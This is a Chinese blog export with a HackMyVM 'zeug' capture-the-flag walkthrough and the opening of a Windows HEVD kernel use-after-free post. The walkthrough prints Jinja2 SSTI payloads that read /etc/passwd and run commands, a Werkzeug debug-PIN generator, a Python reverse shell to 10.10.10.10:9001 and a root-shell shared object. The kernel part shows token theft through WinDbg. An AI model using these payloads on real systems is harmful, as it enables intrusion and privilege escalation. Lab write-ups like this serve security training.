vsftpd 3.0.3</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_-rw-r--r--    1 0        0             109 Jan 06 23:14 README.txt</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.124.13</span><br><span class="line">|      Logged <span class="keyword">in</span> as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth <span class="built_in">limit</span></span><br><span class="line">|      Session <span class="built_in">timeout</span> <span class="keyword">in</span> seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 3</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">5000/tcp open  upnp?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GetRequest: </span><br><span class="line">|     HTTP/1.1 200 OK</span><br><span class="line">|     Server: Werkzeug/3.0.1 Python/3.11.2</span><br><span class="line">|     Date: Thu, 22 Feb 2024 05:56:24 GMT</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Content-Length: 549</span><br><span class="line">|     Connection: close</span><br><span class="line"></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line">Service Info: OS: Unix</span><br></pre></td></tr></table></figure>

<h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><p>anonymous 登录，获得README文件</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">ftp&gt; get README.md</span><br><span class="line"></span><br><span class="line">$ cat README.txt</span><br><span class="line">Hi, Cosette, don&#x27;t forget to disable the debug mode in the web application, we don&#x27;t want security breaches.</span><br></pre></td></tr></table></figure>
<h2 id="Werkzeug-WEB"><a href="#Werkzeug-WEB" class="headerlink" title="Werkzeug WEB"></a>Werkzeug WEB</h2><h3 id="DEBUG"><a href="#DEBUG" class="headerlink" title="DEBUG"></a>DEBUG</h3><p>结合提示，可能是DEBUG模式。访问 <code>/console</code> 路由，但是需要 <code>PIN</code></p>
<h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><p>文件上传，上传html文件解析，但是存在 <code>SSTI</code>，<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2---basic-injection">PayloadsAllTheThings</a></p>
<p>网站设置了黑名单</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;config.items()&#125;&#125;</span><br><span class="line">&#123;&#123; [].<span class="keyword">class</span>.base.subclasses() &#125;&#125;  <span class="comment"># [] subclasses</span></span><br><span class="line">&#123;&#123; self.__init__.__globals__.__builtins__ &#125;&#125;  <span class="comment"># init</span></span><br><span class="line">&#123;&#123; get_flashed_messages.__globals__.__builtins__.<span class="built_in">open</span>(<span class="string">&quot;/etc/passwd&quot;</span>).read() &#125;&#125;</span><br><span class="line">&#123;&#123; lipsum.__globals__[<span class="string">&quot;os&quot;</span>].popen(<span class="string">&#x27;id&#x27;</span>).read() &#125;&#125;  <span class="comment"># os popen</span></span><br></pre></td></tr></table></figure>

<h3 id="PIN码"><a href="#PIN码" class="headerlink" title="PIN码"></a>PIN码</h3><p><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug">Werkzeug &#x2F; Flask Debug - HackTricks</a></p>
<p>结合源码，其计算machin_id 的当时</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_machine_id</span>() -&gt; <span class="built_in">str</span> | <span class="built_in">bytes</span> | <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">global</span> _machine_id</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> _machine_id <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> _machine_id</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_generate</span>() -&gt; <span class="built_in">str</span> | <span class="built_in">bytes</span> | <span class="literal">None</span>:</span><br><span class="line">        linux = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># machine-id is stable across boots, boot_id is not.</span></span><br><span class="line">        <span class="keyword">for</span> filename <span class="keyword">in</span> <span class="string">&quot;/etc/machine-id&quot;</span>, <span class="string">&quot;/proc/sys/kernel/random/boot_id&quot;</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    value = f.readline().strip()</span><br><span class="line">            <span class="keyword">except</span> OSError:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> value:</span><br><span class="line">                linux += value</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/proc/self/cgroup&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                linux += f.readline().strip().rpartition(<span class="string">b&quot;/&quot;</span>)[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">except</span> OSError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> linux:</span><br><span class="line">            <span class="keyword">return</span> linux</span><br></pre></td></tr></table></figure>

<ol>
<li>Username. <code>/etc/passwd : cosette</code></li>
<li>Full path of the app. <code>/home/cosette/zeug/venv/lib/python3.11/site-packages/flask/app.py</code></li>
<li>MAC address of the target machine. <code>/sys/class/net/enp0s3/address =&gt; 08:00:27:8d:5e:6d =&gt; 8796756598381</code></li>
<li>Machine ID : <code>/etc/machine-id=&gt;48329e233f524ec291cce7479927890b</code> &amp;&amp; <code>/proc/sys/kernel/random/boot_id=&gt;901d0a34-e4f9-4a52-8a83-3840d0c0bfb1</code> &amp;&amp; <code>/proc/self/cgroup=&gt;0::/system.slice/zeug-app.service</code>).</li>
</ol>
<p>计算PIN码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;cosette&#x27;</span>,  <span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/home/cosette/zeug/venv/lib/python3.11/site-packages/flask/app.py&#x27;</span>  <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;8796756598381&#x27;</span>,  </span><br><span class="line">    <span class="string">&#x27;48329e233f524ec291cce7479927890bzeug-app.service&#x27;</span>  </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0</span></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"><span class="comment"># h.update(b&#x27;shittysalt&#x27;)</span></span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>


<p>然后得到PIN码，进入DEBUG终端，使用python reverse shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;10.10.10.10&quot;</span>,<span class="number">9001</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>);os.dup2(s.fileno(),<span class="number">2</span>);<span class="keyword">import</span> pty; pty.spawn(<span class="string">&quot;sh&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>升级pty</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line">(inside the nc session) </span><br><span class="line">CTRL+Z</span><br><span class="line"></span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span>; <span class="built_in">ls</span>; <span class="built_in">export</span> SHELL=/bin/bash; <span class="built_in">export</span> TERM=screen; <span class="built_in">stty</span> rows 38 columns 116; reset;</span><br></pre></td></tr></table></figure>


<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>可以执行seed程序</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cosette@zeug:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> cosette on zeug:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User cosette may run the following commands on zeug:</span><br><span class="line">    (exia) NOPASSWD: /home/exia/seed</span><br></pre></td></tr></table></figure>

<p>seed_bak: 备份，这里是个伪随机数，v5是个固定值<code>0x6b8b4567</code>，因此我们可以明确的得到答案</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">banner</span>(argc, argv, envp);</span><br><span class="line">  <span class="built_in">srand</span>(<span class="number">1u</span>);</span><br><span class="line">  v5 = <span class="built_in">rand</span>();</span><br><span class="line">  v6 = <span class="number">0xDEADBEEF</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter a number: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v6 == (v5 ^ v4) )</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后输入密码获得shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u exia /home/exia/seed</span><br></pre></td></tr></table></figure>

<p>提权到root</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">exia@zeug:/dev/shm$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> exia on zeug:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User exia may run the following commands on zeug:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/zeug</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __fastcall <span class="built_in">main</span>(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">dlopen</span>(<span class="string">&quot;/home/exia/exia.so&quot;</span>, <span class="number">2</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">fwrite</span>(<span class="string">&quot;Error opening file\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x13</span>uLL, _bss_start);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>dlopen ：<a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload-and-ld_library_path">Linux Privilege Escalation</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc -fPIC -shared -o pe.so pe.c -nostartfiles</span></span><br><span class="line"><span class="comment">// sudo -u root /usr/bin/zeug</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _init() &#123;</span><br><span class="line">    <span class="built_in">unsetenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    <span class="built_in">setgid</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">setuid</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>HMV</category>
      </categories>
      <tags>
        <tag>HMV</tag>
      </tags>
  </entry>
  <entry>
    <title>HEVD-UAF</title>
    <url>/2024/02/07/HEVD-UAF/</url>
    <content><![CDATA[<blockquote>
<p>Windows Kernel NonPagedPool UAF</p>
</blockquote>
<span id="more"></span>

<p>win10 22h2</p>
<p>相关代码在仓库<a href="https://github.com/Ha0-Y/HEVDExploits">HEVDExploits</a></p>
<h2 id="编译项目"><a href="#编译项目" class="headerlink" title="编译项目"></a>编译项目</h2><p>运行<code>Builder/Build_HEVD_Vulnerable_x64.bat</code></p>
<p>或者VS打开项目，编译。</p>
<ul>
<li>属性-&gt;DriverSetting 先设置为win7&#x2F;win10，生成x64</li>
</ul>
<h2 id="Windows-API"><a href="#Windows-API" class="headerlink" title="Windows API"></a>Windows API</h2><p><code>#pragma alloc_text(PAGE, UseUaFObjectNonPagedPool)</code> 是一个用于在Windows内核开发中指定函数所属代码段属性的编译指令。</p>
<ul>
<li><code>#pragma alloc_text</code> 是一个预处理指令，用于在编译时将函数指定到特定的代码段。</li>
<li><code>PAGE</code> 是<code>#pragma alloc_text</code> 指令后面的参数，用于指定函数所属的代码段。<code>PAGE</code> 表示该函数应该被编译为适用于页码页面的代码段。</li>
</ul>
<p>ExAllocatePoolWithTag: 分配指定类型的池内存，并返回指向已分配块的指针</p>
<ul>
<li><a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ne-wdm-_pool_type">POOL_TYPE (wdm.h)</a></li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">PVOID <span class="title">ExAllocatePoolWithTag</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] __drv_strictTypeMatch(__drv_typeExpr)POOL_TYPE PoolType,         <span class="comment">// 要分配的池内存的类型，POOL_TYPE 枚举</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in] SIZE_T                                         NumberOfBytes,    <span class="comment">// 要分配的字节数</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in] ULONG                                          Tag               <span class="comment">// 要用于已分配内存的池标记，字符串通常按反向顺序指定</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>; </span><br></pre></td></tr></table></figure>

<p>windows 内存管理器创建系统用于分配内存的以下内存池：非分页池和分页池。 这两个内存池都位于为系统保留并映射到每个进程的虚拟地址空间的地址空间区域中。内核池类似于Windows 中的堆, 因为它的作用也是用来动态分配内存</p>
<ul>
<li>非分页池由虚拟内存地址组成，只要分配了相应的内核对象，这些地址就保证驻留在物理内存中。 </li>
<li>分页池由虚拟内存组成，可以分页进出系统。</li>
<li><strong>PagedPool</strong>简单来说就是物理内存不够时，会把这片内存移动到硬盘上，而<strong>NonPagedPool</strong>是无论物理内存如何紧缺，都绝对不把这片内存的内容移动到硬盘上。</li>
</ul>
<p>ExFreePoolWithTag: 释放池内存</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">ExFreePoolWithTag</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PVOID P,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] ULONG Tag</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>NtAllocateReserveObject：ntdll中系统调用。负责在内核端创建保留对象–在内核池上执行内存分配，返回Handle</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS STDCALL <span class="title">NtAllocateReserveObject</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OUT PHANDLE hObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN POBJECT_ATTRIBUTES ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN DWORD ObjectType </span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br></pre></td></tr></table></figure>

<h2 id="驱动层权限提升"><a href="#驱动层权限提升" class="headerlink" title="驱动层权限提升"></a>驱动层权限提升</h2><p>内核数据结构包含了一个指向token的指针。当进程试图去执行各种操作时，比如打开一个文件，token中的账户权限会用于和所需的权限进行比较，以此决定该操作是否可行。</p>
<p>Windows提权：获取 <code>nt authority\system</code>权限</p>
<ul>
<li>将SYSTEM进程的token复制到当前进程，这样当前进程则为system权限<a href="https://bbs.kanxue.com/thread-224058-1.htm">(1)</a>。</li>
<li>编辑ACL&#x2F;ACE 或者 直接修改token中的<code>dt _token : +0x040 Privileges: _SEP_TOKEN_PRIVILEGES</code>以达到权限提升的目的，此方法有一个好处是被修改进程的用户名等信息不会改变，只是权限改变了<a href="https://wonderkun.cc/2021/08/22/windows10%E5%86%85%E6%A0%B8%E6%80%81%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%B1%87%E6%80%BB/">(2)</a></li>
</ul>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>首先找到System进程的16进制地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0: kd&gt; !dml_proc</span><br><span class="line">Address           PID  Image file name</span><br><span class="line">ffff940f`cfea7080 4    System</span><br><span class="line">...</span><br><span class="line">ffff940f`d7240080 2270 cmd.exe</span><br><span class="line"></span><br><span class="line">0: kd&gt; !process 0 0 system</span><br><span class="line">PROCESS ffff940fcfea7080</span><br><span class="line">    SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000</span><br><span class="line">    DirBase: 001ad000  ObjectTable: ffffe78dfac04800  HandleCount: 3023.</span><br><span class="line">    Image: System</span><br></pre></td></tr></table></figure>

<p>它指向一个<code>_EPROCESS</code>结构，查看，一个比较大的结构体</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0: kd&gt; dt _EPROCESS ffff940f`cfea7080</span><br><span class="line">ntdll!_EPROCESS</span><br><span class="line">   +0x000 Pcb              : _KPROCESS</span><br><span class="line">   +0x438 ProcessLock      : _EX_PUSH_LOCK</span><br><span class="line">   +0x440 UniqueProcessId  : 0x00000000`00000004 Void</span><br><span class="line">   +0x448 ActiveProcessLinks : _LIST_ENTRY [ 0xffff940f`cff084c8 - 0xfffff803`7181e130 ]</span><br><span class="line">   +0x458 RundownProtect   : _EX_RUNDOWN_REF</span><br><span class="line">   ...</span><br><span class="line">   +0x4b8 Token            : _EX_FAST_REF</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>

<p>可以看到token偏移（根据系统进行变化，并且token字段是以<code>_EX_FAST_REF</code>来声明的而不是<code>_TOKEN</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0: kd&gt; dq ffffe78dfac04800+4b8 L1</span><br><span class="line">ffffe78d`fac04cb8  ffffe78d`fac0c05e</span><br><span class="line"></span><br><span class="line">0: kd&gt; dt _EX_FAST_REF ffffe78dfac04800+4b8</span><br><span class="line">ntdll!_EX_FAST_REF</span><br><span class="line">   +0x000 Object           : 0xffffe78d`fac0c05e Void</span><br><span class="line">   +0x000 RefCnt           : 0y1110</span><br><span class="line">   +0x000 Value            : 0xffffe78d`fac0c05e</span><br></pre></td></tr></table></figure>

<p>蓝屏警告：这个 <code>token</code> 后四位全为0才是token</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0: kd&gt; !token ffffe78d`fac0c050</span><br></pre></td></tr></table></figure>

<p>定位cmd.exe进程的<code>_EPROCESS</code>结构并替换偏移0x208的token指针值为System的token地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0: kd&gt; !process 0 0 cmd.exe</span><br><span class="line">PROCESS ffff940fd7240080</span><br><span class="line">    SessionId: 1  Cid: 2270    Peb: f4e7043000  ParentCid: 13bc</span><br><span class="line">    DirBase: 172720000  ObjectTable: ffffe78e02a18080  HandleCount:  75.</span><br><span class="line">    Image: cmd.exe</span><br><span class="line"></span><br><span class="line">0: kd&gt; dt _EX_FAST_REF +0x4b8+ffff940fd7240080</span><br><span class="line">ntdll!_EX_FAST_REF</span><br><span class="line">   +0x000 Object           : 0xffffe78e`02dcb06b Void</span><br><span class="line">   +0x000 RefCnt           : 0y1011</span><br><span class="line">   +0x000 Value            : 0xffffe78e`02dcb06b</span><br><span class="line"></span><br><span class="line">0: kd&gt; eq 0x4b8+ffff940fd7240080 0xffffe78d`fac0c050</span><br><span class="line">0: kd&gt; dt _EX_FAST_REF +0x4b8+ffff940fd7240080</span><br><span class="line">ntdll!_EX_FAST_REF</span><br><span class="line">   +0x000 Object           : 0xffffe78d`fac0c05e Void</span><br><span class="line">   +0x000 RefCnt           : 0y1110</span><br><span class="line">   +0x000 Value            : 0xffffe78d`fac0c05e</span><br><span class="line">0: kd&gt; g</span><br></pre></td></tr></table></figure>

<p>替换成功</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">debugger</span>&gt;<span class="title">whoami</span></span></span><br><span class="line"><span class="function"><span class="title">desktop</span>-8<span class="title">h64pu1</span>\<span class="title">debugger</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># <span class="title">WinDbg</span>替换</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">debugger</span>&gt;<span class="title">whoami</span></span></span><br><span class="line"><span class="function"><span class="title">nt</span> <span class="title">authority</span>\<span class="title">system</span></span></span><br></pre></td></tr></table></figure>

<h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>寻找 <code>_KTHREAD</code> 结构：反汇编 <code>PsGetCurrentThread</code> 函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0: kd&gt; uf PsGetCurrentProcess </span><br><span class="line">nt!PsGetCurrentProcess:</span><br><span class="line">fffff801`3f68eea0 65488b042588010000 mov   rax,qword ptr gs:[188h]</span><br><span class="line">fffff801`3f68eea9 488b80b8000000  mov     rax,qword ptr [rax+0B8h]</span><br><span class="line">fffff801`3f68eeb0 c3              ret</span><br></pre></td></tr></table></figure>

<p>其实<code>gs:[188h]</code>的位置存贮的是 <code>_KTHREAD</code> 结构的地址，看一下这个结构，发现0x220的位置存储的就是 <code>_KPROCESS</code>，但是这里是取得 <code>0xb8</code>, 0x98其实存储的结构是<code>_KAPC_STATE</code>，<code>0x20</code>位置存储的就是<code>_KPROCESS</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0: kd&gt; dt _KTHREAD</span><br><span class="line">   ...</span><br><span class="line">   +0x098 ApcStateFill     : [43] UChar</span><br><span class="line">   +0x0c3 Priority         : Char</span><br><span class="line">   ...</span><br><span class="line"></span><br><span class="line">0: kd&gt; dt _KAPC_STATE</span><br><span class="line">ntdll!_KAPC_STATE</span><br><span class="line">   +0x000 ApcListHead      : [2] _LIST_ENTRY</span><br><span class="line">   +0x020 Process          : Ptr64 _KPROCESS</span><br><span class="line">   +0x028 InProgressFlags  : UChar</span><br><span class="line">   +0x028 KernelApcInProgress : Pos 0, 1 Bit</span><br><span class="line">   +0x028 SpecialApcInProgress : Pos 1, 1 Bit</span><br><span class="line">   +0x029 KernelApcPending : UChar</span><br><span class="line">   +0x02a UserApcPendingAll : UChar</span><br><span class="line">   +0x02a SpecialUserApcPending : Pos 0, 1 Bit</span><br><span class="line">   +0x02a UserApcPending   : Pos 1, 1 Bit</span><br></pre></td></tr></table></figure>

<p>因此在r3寻找到 <code>_KPROCESS </code>的实现</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">mov r9, qword ptr gs:[<span class="number">0x188</span>]  </span><br><span class="line">mov r9, qword ptr[r9+<span class="number">0x0B8</span>]</span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line">mov r9, qword ptr gs:[<span class="number">0x188</span>]  </span><br><span class="line">mov r9, qword ptr[r9+<span class="number">0x220</span>]</span><br></pre></td></tr></table></figure>

<p><code>_EPROCESS</code>是包含了<code>_KPROCESS</code>的结构体，他们的起始地址是一样的，我们可以通过dt来查看</p>
<ul>
<li>内核用来跟踪进程的结构是KPROCESS。 执行子系统用来跟踪它的结构是EPROCESS。 作为一个实现细节，KPROCESS是EPROCESS的第一个字段，所以执行子系统分配EPROCESS结构，然后调用coreel来初始化它的KPROCESS部分。最后，这两个结构都是表示用户进程实例的Process Object的一部分。</li>
<li>在<a href="https://stackoverflow.com/questions/5790587/what-is-the-difference-between-eprocess-object-and-kprocess-object">Stack Overflow</a>寻找答案</li>
</ul>
<p>第一个元素就是 <code>_KPROCESS</code>, <code>UniqueProcessId</code> 存储的是当前进程的pid，<code>InheritedFromUniqueProcessId</code>存储的是父进程的pid</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0: kd&gt; dt _EPROCESS</span><br><span class="line">ntdll!_EPROCESS</span><br><span class="line">   +0x000 Pcb              : _KPROCESS</span><br><span class="line">   +0x438 ProcessLock      : _EX_PUSH_LOCK</span><br><span class="line">   +0x440 UniqueProcessId  : Ptr64 Void</span><br><span class="line">   +0x448 ActiveProcessLinks : _LIST_ENTRY</span><br><span class="line">   ...</span><br><span class="line">   +0x540 InheritedFromUniqueProcessId : Ptr64 Void</span><br><span class="line">   +0x548 OwnerProcessId   : Uint8B</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>

<p>因为程序大多数在cmd.exe启动，因此我们获得的是 cmd 的 <code>_KPROCESS</code>，我们需要替换的是这个，我们需要寻找到system进程token</p>
<p>链表元素就是 <code>ActiveProcessLinks</code>，接下来遍历这个链表就可以找到system(pid&#x3D;4)的<code>_KPROCESS</code>。参考<a href="https://bbs.kanxue.com/thread-224058-1.htm">这里</a>，修改偏移为当前系统的</p>
<ul>
